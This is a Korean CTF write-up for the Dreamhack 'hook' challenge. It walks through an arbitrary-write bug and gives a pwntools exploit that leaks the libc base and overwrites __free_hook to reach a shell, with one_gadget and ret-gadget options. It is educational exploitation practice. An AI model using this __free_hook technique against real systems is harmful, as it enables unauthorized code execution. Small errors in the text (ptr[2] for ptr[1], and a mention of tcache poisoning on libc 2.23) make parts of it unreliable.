### 1. 파일 정보

file ./hook
./hook: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=da0d626a71b7c949de9d0f49b0174d73b8e76ea5, not stripped

checksec --file=./hook  
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH        Symbols         FORTIFY Fortified       Fortifiable     FILE
Full RELRO      Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   80 Symbols          No    0               2               ./hook

해당 바이너리에 Full RELRO 가 적용되어 있는 것을 확인할 수 있다. 따라서 다른 문제들과 달리  GOT Overwrite가 불가능하다. 
Canary가 존재하고, NX가 적용되었다.
PIE는 적용되지 않아 바이너리의 원하는 함수 혹은 가젯의 주소를 알 수 있다.

### 2. C 소스파일 분석
``` c
// gcc -o init_fini_array init_fini_array.c -Wl,-z,norelro
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

int main(int argc, char *argv[]) {
    long *ptr;
    size_t size;

    initialize();

    /*
    stdout은 C 표준 라이브러리(libc) 안에 존재하는 전역 구조체 포인터이다.
    따라서 stdout의 주소를 알면, 현재 실행중인 프로세스에서 libc가 어느 위치에 매핑되었는지를 알 수 있다.
    즉, libc base address를 유추 가능
    ASLR이 걸려 있어도 stdout 같은 라이브러리 심볼의 실제 주소를 알면 libc 전체 오프셋을 계산할 수 있다.
    */
    printf("stdout: %p\n", stdout);

    /*
    %ld : long decimal
    */
    printf("Size: ");
    scanf("%ld", &size);

    /*
    heap 영역에 size 바이트 만큼 메모리를 동적으로 할당.
    성공하면 새로 할당된 메모리의 시작주소(포인터)를 반환
    실패하면 NULL 반환.
    */
    ptr = malloc(size);

    printf("Data: ");
    read(0, ptr, size);

    /*
    1. ptr의 타입
    long *ptr; 이라 했으니 ptr은 long 타입의 데이터를 가리키는 포인터이다.
    즉, ptr은 malloc으로 할당한 힙 메모리의 시작 주소를 가리키고 있다.
    
    2. 입력 직후 메모리 구조
    read(0.ptr, size);
    사용자가 입력한 값이 ptr이 가리키는 힙에 저장된다.
    예를 들어, 사용자가 16바이트를 입력했다고 하면:
    ptr[0] = 입력한 첫 8바이트
    ptr[1] = 입력한 두 번째 8바이트

    3. 오른쪽 *(ptr+1)
    ptr+1 -> 두 번재 long(즉, ptr[1])
    *(ptr+1) -> 그 값을 꺼냄.
    즉, 입력값의 두 번째 8바이트

    4. 왼쪽 *(logn *)*ptr
    *ptr -> 입력한 첫번째 8바이트 값(숫자)
    이 숫자를 (long *)로 캐스팅 -> 주소로 취급
    *(long *)*ptr -> 그 주소에 있는 8바이트 메모리에 접근
    즉, 입력한 첫 8바이트를 "주소"로 보고, 그 주소에 값을 써라 는 의미.

    예시.
    입력한 데이터
    [0x601018][0xdeadbeefcafebabe]
    ptr[0] = 0x601018
    ptr[2] = 0xdeadbeefcafebabe 
    ==> 메모리주소 0x601018에 0xdeadbeefcafebabe를 써라.
    ==> 입력값의 첫 8바이트 = 주소, 두 번재 8바이트 = 값 -> 그 주소에 그 값을 써라.
    ==> 즉, Arbitrary Write(임의 주소 쓰기) 취약점 발생.
    */
    *(long *)*ptr = *(ptr+1);

    /*
    free(ptr)을 2회 실행하고 있다. 이는 에러를 일으키기 때문에, free 함수가 변조없이 그대로 실행된다면 다음 라인에 있는 system 함수를 실행할 수 없다.
    */
    free(ptr);
    free(ptr);

    system("/bin/sh");
    return 0;
}
```

main 함수의 마지막에서는 system("/bin/sh")로 셸이 실행되나, 그 직전에 free(ptr); 을 2회 실행한다.
free 함수가 호출되기 때문에 \_\_free_hook을 다른 함수 주소로 덮는다면 두번의 free를 성공적으로 패스하고 system("/bin/sh") 함수 기능을 수행할 수 있을 것이다.

### 3. 익스플로잇

#### 1) libc base 계산
``` python
from pwn import *

'''
e -> 바이너리 파일 ./hook 파싱(함수, GOT, PLT, 섹션정보 등)
libc -> libc-2.23.so ELF 파싱(함수와 변수 offset 확인 가능)
'''
p = process("./hook")
p = remote("host1.dreamhack.games", 24295)
e = ELF("./hook")
libc = ELF("libc-2.23.so")

'''
C 프로그램이 출력한 stdout 주소를 읽어오는 부분.
recvuntil -> "stdout: " 문자열까지 읽고, 이후 숫자만 읽음.
int(..., 16) -> p.recvline()로 받은 문자열을 16진수 정수로 변환.
int("0x7ffff7dd5620", 16)   # 0x7ffff7dd5620 -> 140737351450336(결과는 10진수로 표시됨.
hex()를 이용해서 16진수 정수로 확인할 수 있다.
glibc 내부에서 stdout 전역변수의 실제 심볼 이름은 stdout이 아니라 _IO_2_1_stdout_이다.
libc.symbols["_IO_2_1_stdout_"] → ELF 내부 offset (예: 0x3c5620)
leak된 stdout 주소와 offset 차이를 빼면 → libc 전체가 메모리에 어디에 로드되었는지(base 주소) 계산 가능
'''
p.recvuntil(b"stdout: ")
stdout = int(p.recvline(), 16)
libc_base = stdout - libc.symbols["_IO_2_1_stdout_"]

print(hex(libc_base))
```

#### 2) \_\_free_hook 변조
``` python
'''
키보드로 16 치고 Enter 누른 것과 동일
C 소스코드에 아래와 같이 되어있다. size 변수에 16이 들어가는 결과를 가져옴.
    printf("Size: ");
    scanf("%ld", &size);
'''
p.sendline(b"16")

'''
ibc.symbols["__free_hook"] → __free_hook의 libc 내부 오프셋
libc_base + offset → 메모리에 로드된 실제 주소 계산
즉, hook 변수에는 __free_hook의 런타임 주소가 들어감.

__free_hook
: glibc에서 free() 가 호출될 때 실행되는  함수 포인터
: 임으로 덮으면, free() 호출 시 원하는 함수(system)를 실행 가능.
'''
hook = libc_base + libc.symbols["__free_hook"]

'''
p64() -> 64비트 리틀 엔디안으로 정수->8바이트 bytes로 변환
tcache poisoning 공격에서는 보통:
    첫 8바이트: target 주소(__free_hook)
    두 번째 8바이트: 쓰고 싶은 값(system 주소)
'''
payload = p64(hook) + p64(???)

'''
프로그램이 "Data: " 출력할 때까지 기다린 후, payload 전송
내부적으로는 read()를 통해 입력값이 힙에 쓰임
exploit에서는 tcache / fastbin을 조작하여 __free_hook 에 system 주소를 쓰도록 하는 단계
'''
p.sendlineafter(b"Data: ", payload)

p.interactive()
```

#### 3) p64(???) 두번째 바이트에 어떤 주소를 사용할 수 있는가?

##### one_gadget
```
$ one_gadget libc-2.23.so
0x4527a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL || {[rsp+0x30], [rsp+0x38], [rsp+0x40], [rsp+0x48], ...} is a valid argv

0xf03a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL || {[rsp+0x50], [rsp+0x58], [rsp+0x60], [rsp+0x68], ...} is a valid argv

0xf1247 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...} is a valid argv
```

```
one_gadget = libc_base + [0x4527a, 0xf03a4, 0xf1247][0]
```
하지만 one_gadget은 확률적으로 작동하지 않는 경우가 많다.

##### main의 system("/bin/sh")
main에서 system 함수만을 실행하는 것이 아닌, 정확히 "/bin/sh" 라는 인자까지 같이 실행해 주기 때문에 해당 위치의 주소를 받아와서 셸을 실행 가능하다.
PIE가 걸려있지 않기 때문에 main 의 주소가 정적이고, 따라서 main의 system("/bin/sh") 주소 또한 정적이다.
```
   0x0000000000400a11 <+199>:   mov    edi,0x400aeb
   0x0000000000400a16 <+204>:   call   0x400788 <system@plt>
```

```
main_system_sh = 0x400a11
```

##### printf 혹은 puts
이번에는 셸을 직접 실행시키는 것이 아닌, free 함수가 2회 실행될 시 에러만을 피해 main의 system("/bin/sh") 에 도달하여 셸을 획득해 보자.

gdb ./hook 에서
disass main 하고 printf의 주소 확인

##### ret 가젯
ret 가젯은 아무 명령을 수행하지 않고, 바로 다시 기존 위치로 돌아온다. 따라서 2회 시행되어도 문제가 생기지 않는다.
PIE가 없기 때문에 바이너리에 있는 가젯을 사용하여도 되고,  libc base를 알고 있기 때문에 libc에 있는 가젯을 사용하여도 된다.
```
ret_binary = ROP(e).find_gadget(["ret"])[0]
ret_libc = libc_base + ROP(libc).find_gadget(["ret"])[0]
```

